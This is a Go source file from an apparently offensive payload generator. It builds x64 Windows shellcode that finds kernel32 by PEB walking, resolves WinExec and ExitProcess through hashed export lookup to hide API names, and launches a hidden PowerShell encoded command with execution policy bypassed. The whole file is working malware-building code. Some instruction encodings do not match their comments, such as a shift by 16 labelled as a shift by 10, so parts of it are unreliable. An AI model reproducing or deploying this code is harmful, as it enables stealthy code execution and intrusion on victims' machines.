package payload

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"unicode/utf16"
)

// buildPowershellWinExecShellcode generates x64 shellcode that:
// 1. Resolves WinExec from kernel32 via PEB walking
// 2. Calls WinExec("powershell -EncodedCommand <b64>", 0)
// 3. Calls ExitProcess(0)
func buildPowershellWinExecShellcode(encodedCmd string) []byte {
	return buildPowershellWinExecShellcodeX64(encodedCmd)
}

func buildPowershellWinExecShellcodeX64(encodedCmd string) []byte {
	cmd := "powershell -NoP -EP Bypass -Enc " + encodedCmd

	// WinExec takes an ANSI command line; -Enc arguments are pure ASCII
	// base64, so a plain NUL-terminated byte string is correct here.
	cmdBytes := append([]byte(cmd), 0)

	// Cap the command length, always keeping the NUL terminator intact
	// (truncating it would make WinExec read past the pushed buffer).
	if len(cmdBytes) > 32768 {
		cmdBytes = cmdBytes[:32767]
		cmdBytes = append(cmdBytes, 0)
	}

	// Position-independent x64 WinExec shellcode
	// Uses PEB walking to find kernel32 base, then resolves WinExec and ExitProcess
	sc := []byte{
		// Save registers
		0x53,       // push rbx
		0x51,       // push rcx
		0x52,       // push rdx
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x50, // push r8
		0x41, 0x51, // push r9
		0x41, 0x52, // push r10
		0x41, 0x53, // push r11
		0x41, 0x54, // push r12
		0x41, 0x55, // push r13
		0x41, 0x56, // push r14
		0x41, 0x57, // push r15

		// Get kernel32 base address via PEB
		// mov rax, gs:[0x60]  ; PEB
		// mov rax, [rax+0x18] ; PEB->Ldr
		// mov rax, [rax+0x20] ; Ldr->InMemoryOrderModuleList.Flink (first module)
		// mov rax, [rax]      ; second module (ntdll)
		// mov rax, [rax]      ; third module (kernel32)
		// mov rax, [rax+0x20] ; kernel32 base address (in Win 10 21H2+)
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60]
		0x48, 0x8B, 0x40, 0x18, // mov rax, [rax+0x18]
		0x48, 0x8B, 0x40, 0x20, // mov rax, [rax+0x20]
		0x48, 0x8B, 0x00, // mov rax, [rax]
		0x48, 0x8B, 0x00, // mov rax, [rax]
		0x48, 0x8B, 0x58, 0x20, // mov rbx, [rax+0x20] ; kernel32 base
	}

	// Resolve WinExec from kernel32 exports
	sc = append(sc, resolveExportShellcode(sc, "WinExec")...)
	// Save WinExec address in rdi
	sc = append(sc, []byte{
		0x49, 0x89, 0xC7, // mov r15, rax
	}...)

	// Resolve ExitProcess
	sc = append(sc, resolveExportShellcode(sc, "ExitProcess")...)
	sc = append(sc, []byte{
		0x49, 0x89, 0xC6, // mov r14, rax
	}...)

	// Place command string on stack with proper alignment
	// We'll push the command in reverse chunks
	cmdLen := len(cmdBytes)
	padLen := ((cmdLen + 7) & ^7) - cmdLen
	for i := 0; i < padLen; i++ {
		cmdBytes = append(cmdBytes, 0)
	}
	cmdLen = len(cmdBytes)

	// Push command string in reverse 8-byte chunks
	for i := cmdLen; i > 0; i -= 8 {
		start := i - 8
		if start < 0 {
			start = 0
		}
		var chunk [8]byte
		copy(chunk[:], cmdBytes[start:i])
		val := binary.LittleEndian.Uint64(chunk[:])
		// push val
		sc = append(sc, pushImm64(val)...)
	}

	// mov rcx, rsp (pointer to command string)
	sc = append(sc, []byte{
		0x48, 0x89, 0xE1, // mov rcx, rsp
	}...)

	// sub rsp, 0x30 (align stack for WinExec call)
	sc = append(sc, []byte{
		0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30
	}...)

	// xor rdx, rdx (uCmdShow = SW_HIDE = 0)
	sc = append(sc, []byte{
		0x48, 0x31, 0xD2, // xor rdx, rdx
	}...)

	// call WinExec
	sc = append(sc, []byte{
		0x41, 0xFF, 0xD7, // call r15
	}...)

	// add rsp, 0x30 (restore stack)
	sc = append(sc, []byte{
		0x48, 0x83, 0xC4, 0x30, // add rsp, 0x30
	}...)

	// xor rcx, rcx (ExitProcess(0))
	sc = append(sc, []byte{
		0x48, 0x31, 0xC9, // xor rcx, rcx
	}...)

	// call ExitProcess
	sc = append(sc, []byte{
		0x41, 0xFF, 0xD6, // call r14
	}...)

	// Restore registers
	sc = append(sc, restoreRegsShellcode()...)

	// ret
	sc = append(sc, 0xC3)

	return sc
}

// resolveExportShellcode resolves an API function by hash-walking the PE export table.
// Delegates to buildHashExportShellcode which uses Jenkins one-at-a-time hashing
// to match exports without embedding function names in cleartext.
func resolveExportShellcode(existing []byte, funcName string) []byte {
	_ = existing // available for future use with position-independent stubs
	return buildHashExportShellcode(funcName)
}

// buildHashExportShellcode generates shellcode that resolves kernel32 exports via hash walking.
// Uses the Jenkins one-at-a-time hash algorithm to match export names against the PE export table.
// Expects kernel32 base address in rbx; returns resolved function address in rax.
func buildHashExportShellcode(funcName string) []byte {
	hash := jenkinsHash(funcName)

	// Track byte positions for relative jump backpatching.
	var sc []byte

	// mov r8, rbx  (save kernel32 base in r8, preserved across this stub)
	sc = append(sc, 0x49, 0x89, 0xD8)

	// Parse PE export directory
	sc = append(sc,
		0x41, 0x8B, 0x70, 0x3C, // mov esi, [r8+0x3c]   (e_lfanew)
		0x4C, 0x01, 0xC6,        // add rsi, r8
		0x8B, 0x76, 0x88,        // mov esi, [rsi+0x88]  (ExportDirectory RVA)
		0x4C, 0x01, 0xC6,        // add rsi, r8           (&export_dir)
	)

	// mov r9d, [rsi+0x18]  (NumberOfNames)
	// test r9d, r9d
	sc = append(sc,
		0x44, 0x8B, 0x4E, 0x18,
		0x45, 0x85, 0xC9,
	)
	// je not_found  (rel32 placeholder — 6 bytes)
	notFoundPatch := len(sc)
	sc = append(sc, 0x0F, 0x84, 0, 0, 0, 0)

	// Load AddressOfNames (r10), AddressOfNameOrdinals (r11), AddressOfFunctions (r12)
	sc = append(sc,
		0x44, 0x8B, 0x56, 0x20, // mov r10d, [rsi+0x20]
		0x4D, 0x01, 0xC2,        // add r10, r8
		0x44, 0x8B, 0x5E, 0x24, // mov r11d, [rsi+0x24]
		0x4D, 0x01, 0xC3,        // add r11, r8
		0x44, 0x8B, 0x66, 0x1C, // mov r12d, [rsi+0x1C]
		0x4D, 0x01, 0xC4,        // add r12, r8
	)

	// xor edi, edi  (i = 0)
	sc = append(sc, 0x31, 0xFF)

	// ── name_loop_start ──
	nameLoopStart := len(sc)

	// r13d = AddressOfNames[i]; r13 += base  (get pointer to export name)
	sc = append(sc,
		0x47, 0x8B, 0x2C, 0xBA, // mov r13d, [r10+rdi*4]
		0x4D, 0x01, 0xC5,        // add r13, r8
	)

	// xor eax, eax  (hash = 0)
	sc = append(sc, 0x31, 0xC0)

	// ── hash_loop_start ──
	hashLoopStart := len(sc)

	// movzx ecx, byte [r13+0]  (load next char; +0 needed because [r13] with mod=00 = [RBP+disp32])
	sc = append(sc, 0x41, 0x0F, 0xB6, 0x4D, 0x00)

	// je hash_done  (rel8 placeholder)
	hashDonePatch := len(sc)
	sc = append(sc, 0x74, 0)

	// Jenkins: hash += c
	sc = append(sc, 0x01, 0xC8) // add eax, ecx

	// Jenkins: hash += hash << 10
	sc = append(sc,
		0x89, 0xC2,       // mov edx, eax
		0xC1, 0xE2, 0x10, // shl edx, 10
		0x01, 0xD0,       // add eax, edx
	)

	// Jenkins: hash ^= hash >> 6
	sc = append(sc,
		0x89, 0xC2,       // mov edx, eax
		0xC1, 0xEA, 0x06, // shr edx, 6
		0x31, 0xD0,       // xor eax, edx
	)

	// inc r13  (advance name pointer)
	sc = append(sc, 0x49, 0xFF, 0xC5)

	// jmp hash_loop_start  (rel8 placeholder)
	jmpBackPatch := len(sc)
	sc = append(sc, 0xEB, 0)

	// Backfill je hash_done
	sc[hashDonePatch+1] = byte(len(sc) - (hashDonePatch + 2))

	// Backfill jmp hash_loop_start
	sc[jmpBackPatch+1] = byte(int8(hashLoopStart - (jmpBackPatch + 2)))

	// ── Jenkins finalization ──

	// hash += hash << 3
	sc = append(sc,
		0x89, 0xC2,       // mov edx, eax
		0xC1, 0xE2, 0x03, // shl edx, 3
		0x01, 0xD0,       // add eax, edx
	)
	// hash ^= hash >> 11
	sc = append(sc,
		0x89, 0xC2,       // mov edx, eax
		0xC1, 0xEA, 0x0B, // shr edx, 11
		0x31, 0xD0,       // xor eax, edx
	)
	// hash += hash << 15
	sc = append(sc,
		0x89, 0xC2,       // mov edx, eax
		0xC1, 0xE2, 0x0F, // shl edx, 15
		0x01, 0xD0,       // add eax, edx
	)

	// cmp eax, imm32  (compare with target hash)
	sc = append(sc, 0x3D)
	var h [4]byte
	binary.LittleEndian.PutUint32(h[:], hash)
	sc = append(sc, h[:]...)

	// jne next_export  (rel32 placeholder)
	nextExportPatch := len(sc)
	sc = append(sc, 0x0F, 0x85, 0, 0, 0, 0)

	// ── found: resolve function address ──

	// movzx eax, word [r11+rdi*2]  (ordinal = AddressOfNameOrdinals[i])
	sc = append(sc,
		0x41, 0x0F, 0xB7, 0x04, 0x7B,
	)
	// mov eax, [r12+rax*4]         (rva = AddressOfFunctions[ordinal])
	sc = append(sc,
		0x41, 0x8B, 0x04, 0x84,
	)
	// add rax, r8                   (absolute address)
	sc = append(sc, 0x49, 0x01, 0xC0)

	// jmp done  (rel32 placeholder)
	donePatch := len(sc)
	sc = append(sc, 0xE9, 0, 0, 0, 0)

	// ── next_export ──
	nextExportOffset := int32(len(sc) - (nextExportPatch + 6))
	binary.LittleEndian.PutUint32(sc[nextExportPatch+2:], uint32(nextExportOffset))

	// inc edi; cmp edi, r9d
	sc = append(sc,
		0xFF, 0xC7,       // inc edi
		0x41, 0x3B, 0xF9, // cmp edi, r9d
	)
	// jl name_loop_start  (rel8)
	sc = append(sc, 0x7C, byte(int8(nameLoopStart-(len(sc)+2))))

	// ── not_found: xor eax, eax ──
	sc = append(sc, 0x31, 0xC0)

	// ── done: backfill je not_found ──
	notFoundOffset := int32(len(sc) - (notFoundPatch + 6))
	binary.LittleEndian.PutUint32(sc[notFoundPatch+2:], uint32(notFoundOffset))

	// Backfill jmp done
	doneOffset := int32(len(sc) - (donePatch + 5))
	binary.LittleEndian.PutUint32(sc[donePatch+1:], uint32(doneOffset))

	return sc
}

func pushImm64(val uint64) []byte {
	if val <= 0xFFFFFFFF {
		return []byte{
			0x68, byte(val), byte(val >> 8), byte(val >> 16), byte(val >> 24),
		}
	}
	// mov rax, val; push rax
	b := make([]byte, 10)
	b[0] = 0x48
	b[1] = 0xB8
	binary.LittleEndian.PutUint64(b[2:], val)
	b = append(b, 0x50) // push rax
	return b
}

func restoreRegsShellcode() []byte {
	return []byte{
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5A, // pop rdx
		0x59, // pop rcx
		0x5B, // pop rbx
	}
}

func jenkinsHash(s string) uint32 {
	var hash uint32
	for _, c := range s {
		hash += uint32(c)
		hash += hash << 10
		hash ^= hash >> 6
	}
	hash += hash << 3
	hash ^= hash >> 11
	hash += hash << 15
	return hash
}

// utf16leEncode encodes a string to UTF-16LE bytes (used by PowerShell -Enc).
func utf16leEncode(s string) []byte {
	var buf bytes.Buffer
	for _, r := range s {
		for _, w := range utf16.Encode([]rune{r}) {
			_ = binary.Write(&buf, binary.LittleEndian, w)
		}
	}
	return buf.Bytes()
}

// GenerateBasicShellcode creates minimal x64 shellcode that runs a command via WinExec.
// This is a fallback when donut CLI isn't available.
func GenerateBasicShellcode(cmd string) ([]byte, error) {
	if cmd == "" {
		return nil, fmt.Errorf("empty command")
	}
	// Max safe command length (after UTF-16LE encoding this doubles)
	if len(cmd) > 4096 {
		cmd = cmd[:4096]
	}
	// Base64-encode the UTF-16LE command for PowerShell -Enc flag
	encodedCmd := base64.StdEncoding.EncodeToString(utf16leEncode(cmd))
	return buildPowershellWinExecShellcodeX64(encodedCmd), nil
}
